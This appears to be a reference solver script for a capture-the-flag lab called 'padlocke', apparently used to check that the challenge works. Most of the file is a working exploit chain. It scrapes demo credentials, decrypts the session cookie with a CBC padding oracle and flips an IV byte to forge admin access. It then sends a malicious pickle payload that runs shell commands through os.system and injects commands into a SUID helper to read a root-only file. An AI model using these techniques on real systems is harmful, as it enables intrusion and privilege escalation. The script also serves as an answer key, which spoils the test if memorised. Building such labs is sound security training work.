#!/usr/bin/env python3
"""padlocke black-box kill chain (stdlib-only reference solver).

usage: solve.py BASE [LOCAL_TXT [PROOF_TXT]]
  BASE e.g. http://127.0.0.1:18962
  LOCAL_TXT/PROOF_TXT optional host-side flag files for byte-exact compare.

Chain: login -> status-differential oracle on /api/v1/session -> CBC
padding-oracle decrypt -> seal-byte flip (admin 0->1) -> /admin/portal ->
pickle restore RCE (echo channel via vault) -> SUID vaultcheck injection
-> proof readback. Prints PASS/FAIL + ELAPSED.
"""
import base64
import http.client
import json
import os
import pickle
import re
import sys
import time
from urllib.parse import urlparse

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18962"
U = urlparse(BASE)
T0 = time.perf_counter()
NPROBE = 0


def req(method, path, body=None, headers=None):
    c = http.client.HTTPConnection(U.hostname, U.port, timeout=10)
    c.request(method, path, body=body, headers=headers or {})
    r = c.getresponse()
    data, hdrs = r.read(), dict(r.getheaders())
    c.close()
    return r.status, data, hdrs


def probe(token):
    global NPROBE
    NPROBE += 1
    st, _, _ = req("GET", "/api/v1/session", headers={"Cookie": "sess=" + token})
    return st


def ok(msg):
    print(f"[PASS] {msg}")


def fail(msg):
    print(f"[FAIL] {msg}")
    sys.exit(1)


# 1) landing: zero engine/version self-disclosure check + grab demo creds
st, body, hdrs = req("GET", "/")
if st != 200:
    fail(f"landing {st}")
blob = (body + json.dumps(hdrs).encode()).lower()
for sig in (b"flask", b"werkzeug", b"gunicorn", b"python", b"django", b"apache",
            b"nginx", b"3.12", b"tornado", b"bottle"):
    if sig in blob:
        fail(f"version/engine self-disclosure: {sig!r}")
ok("landing 200, zero engine/version self-disclosure")

m = re.search(rb"<code>([A-Za-z0-9._-]+)</code>\s*/\s*<code>(\S+?)</code>", body)
if not m:
    fail("landing page does not disclose a demo account")
demo_user, demo_pass = m.group(1).decode(), m.group(2).decode()
ok(f"landing discloses staff demo account: {demo_user} / (password scraped)")

st, body, _ = req("GET", "/api/health")
if st != 200 or b'"ok":true' not in body:
    fail("health")
ok("health 200")

# 2) login -> sealed envelope cookie
st, body, hdrs = req("POST", "/api/v1/auth/login",
                     body=json.dumps({"user": demo_user, "password": demo_pass}),
                     headers={"Content-Type": "application/json"})
if st != 200:
    fail(f"login {st}")
sc = hdrs.get("Set-Cookie", "")
tok = next((p.strip()[5:] for p in sc.split(";") if p.strip().startswith("sess=")), None)
if not tok:
    fail("no sess cookie")
ok("login issued session envelope")

# 3) baseline + oracle triad
if probe(tok) != 200:
    fail("baseline session 200 expected")
if probe("!!!") != 403:
    fail("malformed envelope -> 403 expected")
raw = base64.b64decode(tok)
got500 = False
for pos in (-1, -5, -9):
    tam = bytearray(raw)
    tam[pos] ^= 0xFF
    if probe(base64.b64encode(bytes(tam)).decode()) == 500:
        got500 = True
        break
if not got500:
    fail("tampered ciphertext never yielded 500 (no padding oracle signal)")
ok("status triad observed: 200 ok / 403 malformed / 500 padding-fail (oracle live)")

# 4) CBC padding-oracle decrypt blocks 0..2
iv = raw[:16]
blocks = [raw[16 + 16 * i:32 + 16 * i] for i in range((len(raw) - 16) // 16)]


def po_block(idx):
    prefix = iv if idx == 0 else blocks[idx - 1]
    target = blocks[idx]
    inter = [None] * 16
    for padn in range(1, 17):
        pos = 16 - padn
        solved = False
        for g in range(256):
            p2 = bytearray(prefix)
            for q in range(pos + 1, 16):
                p2[q] = inter[q] ^ padn
            p2[pos] = g
            if probe(base64.b64encode(bytes(p2) + target).decode()) != 500:
                inter[pos] = g ^ padn
                solved = True
                break
        if not solved:
            fail(f"oracle stalled block {idx} pos {pos}")
    return bytes(inter[q] ^ prefix[q] for q in range(16))


plain = b"".join(po_block(i) for i in range(3))
try:
    sess = json.loads(plain.split(b"\x00")[0])
except ValueError:
    pass  # tail of ts spills into block 3; only structural fields needed
marker = plain.find(b'"admin":')
if marker < 0:
    fail(f"decrypted plaintext lacks admin field: {plain!r}")
off_admin = marker + len(b'"admin":')
if plain[off_admin:off_admin + 1] != b"0":
    fail(f"admin byte not '0': {plain[off_admin:off_admin+1]!r}")
ok(f"padding-oracle decrypted envelope: {plain[:off_admin+1].decode()}... "
   f"({NPROBE} probes)")

# 5) seal-byte flip: admin '0'(0x30)->'1'(0x31) via IV malleability (block 0)
bi, off = off_admin // 16, off_admin % 16
if bi != 0:
    fail(f"admin byte landed in block {bi}; IV-flip path expects block 0")
new = bytearray(raw)
new[off] ^= 0x01  # IV byte at same offset controls P0[off] only
tok2 = base64.b64encode(bytes(new)).decode()
st, body, _ = req("GET", "/admin/portal", headers={"Cookie": "sess=" + tok2})
if st != 200 or b"vaultcheck" not in body:
    fail(f"admin portal after seal-flip: {st} {body[:120]!r}")
ok("seal-flip accepted: admin portal 200 (restore/vault/vaultcheck disclosed)")

# 6) pickle restore RCE -> echo channel via vault
class P:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


p1 = pickle.dumps(P("cp /home/vault/local.txt /var/lib/vault/out.chk "
                    "&& chmod 644 /var/lib/vault/out.chk"))
st, body, _ = req("POST", "/api/v1/restore", body=p1,
                  headers={"Cookie": "sess=" + tok2,
                           "Content-Type": "application/octet-stream"})
if st != 202:
    fail(f"restore #1 {st} {body[:120]!r}")
st, body, _ = req("GET", "/api/v1/vault?name=out.chk", headers={"Cookie": "sess=" + tok2})
if st != 200:
    fail(f"vault readback out.chk {st}")
local_flag = body.decode().strip()
if not local_flag.startswith("FLAG{"):
    fail(f"local flag format: {local_flag[:60]!r}")
ok(f"RCE via snapshot restore -> local flag via vault echo: {local_flag}")

# 7) SUID vaultcheck injection -> root read -> proof echo
p2 = pickle.dumps(P("/usr/local/bin/vaultcheck 'legacy-report.chk; "
                   "base64 /root/proof.txt > /var/lib/vault/p.chk; "
                   "chmod 644 /var/lib/vault/p.chk'"))
st, body, _ = req("POST", "/api/v1/restore", body=p2,
                  headers={"Cookie": "sess=" + tok2,
                           "Content-Type": "application/octet-stream"})
if st != 202:
    fail(f"restore #2 {st} {body[:120]!r}")
time.sleep(0.3)
st, body, _ = req("GET", "/api/v1/vault?name=p.chk", headers={"Cookie": "sess=" + tok2})
if st != 200:
    fail(f"vault readback p.chk {st}")
try:
    proof_flag = base64.b64decode(body.strip()).decode().strip()
except Exception:
    fail(f"p.chk not base64(root flag): {body[:80]!r}")
if not proof_flag.startswith("FLAG{"):
    fail(f"proof flag format: {proof_flag[:60]!r}")
ok(f"SUID helper injection -> root read -> proof flag: {proof_flag}")

# 8) hardening + decoy checks
st, _, _ = req("GET", "/api/v1/vault?name=../root/proof.txt",
               headers={"Cookie": "sess=" + tok2})
if st != 400:
    fail(f"traversal gate: ../root/proof.txt -> {st}, want 400")
ok("vault traversal gate holds (basename-only)")
st, body, _ = req("GET", "/api/v1/vault?name=legacy-report.chk",
                  headers={"Cookie": "sess=" + tok2})
if st != 200 or b"padl0cke_l3gacy" not in body:
    fail("decoy flag unreachable via vault")
ok("decoy flag reachable in vault (trap live)")

# 9) byte-exact compare if host-side flag files given
if len(sys.argv) >= 4:
    want_l = open(sys.argv[2]).read().strip()
    want_p = open(sys.argv[3]).read().strip()
    if local_flag != want_l:
        fail("local flag byte mismatch vs archive")
    if proof_flag != want_p:
        fail("proof flag byte mismatch vs archive")
    ok("both flags byte-exact vs host archive")

print(f"[DONE] probes={NPROBE} elapsed={time.perf_counter()-T0:.1f}s")
